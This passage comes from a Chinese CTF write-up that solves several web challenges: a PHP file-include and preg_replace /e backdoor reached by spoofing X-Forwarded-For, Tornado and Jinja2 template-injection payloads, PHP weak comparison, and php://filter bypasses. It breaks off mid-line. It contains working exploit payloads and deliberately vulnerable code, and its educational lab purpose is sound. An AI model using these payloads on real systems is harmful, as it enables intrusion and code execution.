class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-meta">error_reporting(0);</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">@session_start();</span><br><span class="hljs-meta">posix_setuid(1000);</span><br><span class="hljs-meta"></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">HTML</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;renderer&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;webkit&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;X-UA-Compatible&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;IE=edge,chrome=1&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1, maximum-scale=1&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;layui/css/layui.css&quot;</span> <span class="hljs-attr">media</span>=<span class="hljs-string">&quot;all&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>设备维护中心<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;layui-nav&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;layui-nav-item layui-this&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;?page=index&quot;</span>&gt;</span>云平台设备维护中心<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">fieldset</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;layui-elem-field layui-field-title&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;margin-top: 30px;&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">legend</span>&gt;</span>设备列表<span class="hljs-tag">&lt;/<span class="hljs-name">legend</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">fieldset</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;layui-hide&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;test&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/html&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;switchTpl&quot;</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span><br><span class="language-xml"><span class="language-handlebars">        <span class="hljs-comment">&lt;!-- 这里的 checked 的状态只是演示 --&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;sex&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;</span></span></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">d.id</span>&#125;&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span> <span class="hljs-attr">lay-skin</span>=<span class="hljs-string">&quot;switch&quot;</span> <span class="hljs-attr">lay-text</span>=<span class="hljs-string">&quot;开|关&quot;</span> <span class="hljs-attr">lay-filter</span>=<span class="hljs-string">&quot;checkDemo&quot;</span> </span></span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">d.id</span>==<span class="hljs-number">1</span> <span class="hljs-number">0003</span> ? <span class="hljs-string">&#x27;checked&#x27;</span> : <span class="hljs-string">&#x27;&#x27;</span> &#125;&#125;</span><span class="language-xml"><span class="hljs-tag">&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">    </span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;layui/layui.js&quot;</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    layui.<span class="hljs-title function_">use</span>(<span class="hljs-string">&#x27;table&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">        <span class="hljs-keyword">var</span> table = layui.<span class="hljs-property">table</span>,</span><br><span class="language-javascript">            form = layui.<span class="hljs-property">form</span>;</span><br><span class="language-javascript"></span><br><span class="language-javascript">        table.<span class="hljs-title function_">render</span>(&#123;</span><br><span class="language-javascript">            <span class="hljs-attr">elem</span>: <span class="hljs-string">&#x27;#test&#x27;</span>,</span><br><span class="language-javascript">            <span class="hljs-attr">url</span>: <span class="hljs-string">&#x27;/somrthing.json&#x27;</span>,</span><br><span class="language-javascript">            <span class="hljs-attr">cellMinWidth</span>: <span class="hljs-number">80</span>,</span><br><span class="language-javascript">            <span class="hljs-attr">cols</span>: [</span><br><span class="language-javascript">                [</span><br><span class="language-javascript">                    &#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;numbers&#x27;</span> &#125;,</span><br><span class="language-javascript">                     &#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;checkbox&#x27;</span> &#125;,</span><br><span class="language-javascript">                     &#123; <span class="hljs-attr">field</span>: <span class="hljs-string">&#x27;id&#x27;</span>, <span class="hljs-attr">title</span>: <span class="hljs-string">&#x27;ID&#x27;</span>, <span class="hljs-attr">width</span>: <span class="hljs-number">100</span>, <span class="hljs-attr">unresize</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">sort</span>: <span class="hljs-literal">true</span> &#125;,</span><br><span class="language-javascript">                     &#123; <span class="hljs-attr">field</span>: <span class="hljs-string">&#x27;name&#x27;</span>, <span class="hljs-attr">title</span>: <span class="hljs-string">&#x27;设备名&#x27;</span>, <span class="hljs-attr">templet</span>: <span class="hljs-string">&#x27;#nameTpl&#x27;</span> &#125;,</span><br><span class="language-javascript">                     &#123; <span class="hljs-attr">field</span>: <span class="hljs-string">&#x27;area&#x27;</span>, <span class="hljs-attr">title</span>: <span class="hljs-string">&#x27;区域&#x27;</span> &#125;,</span><br><span class="language-javascript">                     &#123; <span class="hljs-attr">field</span>: <span class="hljs-string">&#x27;status&#x27;</span>, <span class="hljs-attr">title</span>: <span class="hljs-string">&#x27;维护状态&#x27;</span>, <span class="hljs-attr">minWidth</span>: <span class="hljs-number">120</span>, <span class="hljs-attr">sort</span>: <span class="hljs-literal">true</span> &#125;,</span><br><span class="language-javascript">                     &#123; <span class="hljs-attr">field</span>: <span class="hljs-string">&#x27;check&#x27;</span>, <span class="hljs-attr">title</span>: <span class="hljs-string">&#x27;设备开关&#x27;</span>, <span class="hljs-attr">width</span>: <span class="hljs-number">85</span>, <span class="hljs-attr">templet</span>: <span class="hljs-string">&#x27;#switchTpl&#x27;</span>, <span class="hljs-attr">unresize</span>: <span class="hljs-literal">true</span> &#125;</span><br><span class="language-javascript">                ]</span><br><span class="language-javascript">            ],</span><br><span class="language-javascript">            <span class="hljs-attr">page</span>: <span class="hljs-literal">true</span></span><br><span class="language-javascript">        &#125;);</span><br><span class="language-javascript">    &#125;);</span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    layui.<span class="hljs-title function_">use</span>(<span class="hljs-string">&#x27;element&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">        <span class="hljs-keyword">var</span> element = layui.<span class="hljs-property">element</span>; <span class="hljs-comment">//导航的hover效果、二级菜单等功能，需要依赖element模块</span></span><br><span class="language-javascript">        <span class="hljs-comment">//监听导航点击</span></span><br><span class="language-javascript">        element.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;nav(demo)&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">elem</span>) &#123;</span><br><span class="language-javascript">            <span class="hljs-comment">//console.log(elem)</span></span><br><span class="language-javascript">            layer.<span class="hljs-title function_">msg</span>(elem.<span class="hljs-title function_">text</span>());</span><br><span class="language-javascript">        &#125;);</span><br><span class="language-javascript">    &#125;);</span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$page = $_GET[page];</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">if (isset($page)) &#123;</span><br><span class="hljs-meta"></span><br><span class="hljs-meta"></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">if (ctype_alnum($page)) &#123;</span><br><span class="hljs-meta">?&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;text-align:center&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;lead&quot;</span>&gt;</span><span class="hljs-meta">&lt;?php echo $page; die();?&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">&#125;else&#123;</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">?&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;text-align:center&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;lead&quot;</span>&gt;</span><br>                <span class="hljs-meta">&lt;?php</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">                if (strpos($page, &#x27;input&#x27;) &gt; 0) &#123;</span><br><span class="hljs-meta">                    die();</span><br><span class="hljs-meta">                &#125;</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">                if (strpos($page, &#x27;ta:text&#x27;) &gt; 0) &#123;</span><br><span class="hljs-meta">                    die();</span><br><span class="hljs-meta">                &#125;</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">                if (strpos($page, &#x27;text&#x27;) &gt; 0) &#123;</span><br><span class="hljs-meta">                    die();</span><br><span class="hljs-meta">                &#125;</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">                if ($page === &#x27;index.php&#x27;) &#123;</span><br><span class="hljs-meta">                    die(&#x27;Ok&#x27;);</span><br><span class="hljs-meta">                &#125;</span><br><span class="hljs-meta">                    include($page);</span><br><span class="hljs-meta">                    die();</span><br><span class="hljs-meta">                ?&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-meta">&#125;&#125;</span><br><span class="hljs-meta"></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">if ($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;] === &#x27;127.0.0.1&#x27;) &#123;</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">    echo &quot;&lt;br &gt;Welcome My Admin ! &lt;br &gt;&quot;;</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">    $pattern = $_GET[pat];</span><br><span class="hljs-meta">    $replacement = $_GET[rep];</span><br><span class="hljs-meta">    $subject = $_GET[sub];</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">    if (isset($pattern) &amp;&amp; isset($replacement) &amp;&amp; isset($subject)) &#123;</span><br><span class="hljs-meta">        preg_replace($pattern, $replacement, $subject);</span><br><span class="hljs-meta">    &#125;else&#123;</span><br><span class="hljs-meta">        die();</span><br><span class="hljs-meta">    &#125;</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">&#125;</span><br><span class="hljs-meta"></span><br><span class="hljs-meta"></span><br><span class="hljs-meta"></span><br><span class="hljs-meta"></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br><br></code></pre></td></tr></table></figure></details><p>我们摘出关键信息</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br>@<span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-title function_ invoke__">posix_setuid</span>(<span class="hljs-number">1000</span>);<br><br><br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$page</span> = <span class="hljs-variable">$_GET</span>[page];<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$page</span>)) &#123;<br>	<span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ctype_alnum</span>(<span class="hljs-variable">$page</span>)) &#123;<br><span class="hljs-meta">?&gt;</span><br><br>    &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;<br>    &lt;div style=<span class="hljs-string">&quot;text-align:center&quot;</span>&gt;<br>        &lt;p <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">lead</span>&quot;&gt;&lt;?<span class="hljs-title">php</span> <span class="hljs-title">echo</span> $<span class="hljs-title">page</span>; <span class="hljs-title">die</span>();?&gt;&lt;/<span class="hljs-title">p</span>&gt;</span><br><span class="hljs-class">    &lt;<span class="hljs-title">br</span> /&gt;&lt;<span class="hljs-title">br</span> /&gt;&lt;<span class="hljs-title">br</span> /&gt;&lt;<span class="hljs-title">br</span> /&gt;</span><br><span class="hljs-class"></span><br><span class="hljs-class">&lt;?<span class="hljs-title">php</span></span><br><span class="hljs-class"></span><br><span class="hljs-class">&#125;<span class="hljs-title">else</span></span>&#123;<br><br><span class="hljs-meta">?&gt;</span><br>        &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;<br>        &lt;div style=<span class="hljs-string">&quot;text-align:center&quot;</span>&gt;<br>            &lt;p <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">lead</span>&quot;&gt;</span><br><span class="hljs-class">                &lt;?<span class="hljs-title">php</span></span><br><span class="hljs-class"></span><br><span class="hljs-class">                <span class="hljs-title">if</span> (<span class="hljs-title">strpos</span>($<span class="hljs-title">page</span>, &#x27;<span class="hljs-title">input</span>&#x27;) &gt; 0) </span>&#123;<br>                    <span class="hljs-keyword">die</span>();<br>                &#125;<br><br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$page</span>, <span class="hljs-string">&#x27;ta:text&#x27;</span>) &gt; <span class="hljs-number">0</span>) &#123;<br>                    <span class="hljs-keyword">die</span>();<br>                &#125;<br><br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$page</span>, <span class="hljs-string">&#x27;text&#x27;</span>) &gt; <span class="hljs-number">0</span>) &#123;<br>                    <span class="hljs-keyword">die</span>();<br>                &#125;<br><br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$page</span> === <span class="hljs-string">&#x27;index.php&#x27;</span>) &#123;<br>                    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Ok&#x27;</span>);<br>                &#125;<br>                    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$page</span>);<br>                    <span class="hljs-keyword">die</span>();<br>                <span class="hljs-meta">?&gt;</span><br>        &lt;/p&gt;<br>        &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;<br><br><span class="hljs-meta">&lt;?php</span><br>&#125;&#125;<br><br><span class="hljs-comment">//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>] === <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>) &#123;<br><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br &gt;Welcome My Admin ! &lt;br &gt;&quot;</span>;<br><br>    <span class="hljs-variable">$pattern</span> = <span class="hljs-variable">$_GET</span>[pat];<br>    <span class="hljs-variable">$replacement</span> = <span class="hljs-variable">$_GET</span>[rep];<br>    <span class="hljs-variable">$subject</span> = <span class="hljs-variable">$_GET</span>[sub];<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$pattern</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$replacement</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$subject</span>)) &#123;<br>        <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$pattern</span>, <span class="hljs-variable">$replacement</span>, <span class="hljs-variable">$subject</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>于是伪造 <code>X-Forwarded-For: 127.0.0.1</code> 绕过检查（这里需要删除 <code>page</code> 参数</p><p>再利用 <code>preg_replace</code> 的 <code>/e</code> 模式进行命令执行</p><p><code>?pat=/.*/e&amp;rep=phpinfo();&amp;sub=1</code></p><p><img src="/posts/df9d333d/image-20240320002116111.png" srcset="/img/loading.gif" lazyload alt="image-20240320002116111"></p><p>得到路径 <code>s3chahahaDir/flag/flag.php</code></p><p>再次使用前面的 <code>php://filter/read=convert.base64-encode/resource=s3chahahaDir/flag/flag.php</code> 得到flag</p><h2 id="easytornado"><a href="#easytornado" class="headerlink" title="easytornado"></a>easytornado</h2><p>考察SSTI</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs hint.txt">/hints.txt<br>md5(cookie_secret+md5(filename))<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs flag.txt">/flag.txt<br>flag in /fllllllllllllag<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs welcome.txt">/welcome.txt<br>render<br></code></pre></td></tr></table></figure><p>随便修改参数进入 <code>error?msg=</code> 发现此处可进行渲染</p><p>尝试 <code>config</code>失败</p><p>查了下资料要用 <code>handler.settings</code> ，得到</p><p><img src="/posts/df9d333d/image-20240320010417945.png" srcset="/img/loading.gif" lazyload alt="image-20240320010417945"></p><p>根据 hint</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">filehash = md5(&#x27;de045cd4-e5cb-445d-83a9-5491b7fb8e9a&#x27; + md5(&#x27;/fllllllllllllag&#x27;))<br></code></pre></td></tr></table></figure><h2 id="lottry"><a href="#lottry" class="headerlink" title="lottry"></a>lottry</h2><p>php 弱比较</p><p><img src="/posts/df9d333d/image-20240320141336840.png" srcset="/img/loading.gif" lazyload alt="image-20240320141336840"></p><p>只要使 <code>$number[$i]</code> 为 <code>true</code> 就行，这样只要 <code>$win_numbers</code> 不全为0即可拿到大奖，多试几次就攒够了</p><h2 id="shrine"><a href="#shrine" class="headerlink" title="shrine"></a>shrine</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> flask <br><span class="hljs-keyword">import</span> os app = flask.Flask(__name__) <br>app.config[<span class="hljs-string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span class="hljs-string">&#x27;FLAG&#x27;</span>) <br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>) </span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>(): <br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(__file__).read() <br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/shrine/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">shrine</span>(<span class="hljs-params">shrine</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">safe_jinja</span>(<span class="hljs-params">s</span>):<br>        s = s.replace(<span class="hljs-string">&#x27;(&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-string">&#x27;)&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>        blacklist = [<span class="hljs-string">&#x27;config&#x27;</span>, <span class="hljs-string">&#x27;self&#x27;</span>] <br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> blacklist]) + s <br>    <span class="hljs-keyword">return</span> flask.render_template_string(safe_jinja(shrine))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>: app.run(debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p>一眼SSTI</p><p>过滤了<code>(</code>,<code>)</code>,<code>config</code>,<code>self</code></p><p>可以通过 <strong>全局变量</strong> 绕过</p><ul><li><code>&#123;&#123;url_for.__globals__['current_app'].config.FLAG&#125;&#125;</code></li><li><code>&#123;&#123;get_flashed_messages.__globals__['current_app'].config.FLAG&#125;&#125;</code></li></ul><h2 id="file-include"><a href="#file-include" class="headerlink" title="file_include"></a>file_include</h2><p>尝试 <code>php://filter/read=convert.base64-encode/resource=check.php</code></p><p>发现encode被过滤了</p><p>同时base64、rot、quoted也不行</p><p>尝试 <code>php://filter/convert.iconv.utf-8.utf-7/resource=check.php</code>得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs utf-7">+ADw?php if(+ACQAXw-GET+AFsAIg-filename+ACIAXQ)+AHs +ACQ-preg+AF8-match+AF8-username +AD0 &#x27;return preg+AF8-match(+ACI-/base+AHw-be+AHw-encode+AHw-print+AHw-zlib+AHw-quoted+AHw-write+AHw-rot13+AHw-read+AHw-string/i+ACI, +ACQAXw-GET+AFsAIg-filename+ACIAXQ)+ADs&#x27;+ADs if (eval(+ACQ-preg+AF8-match+AF8-username)) +AHs 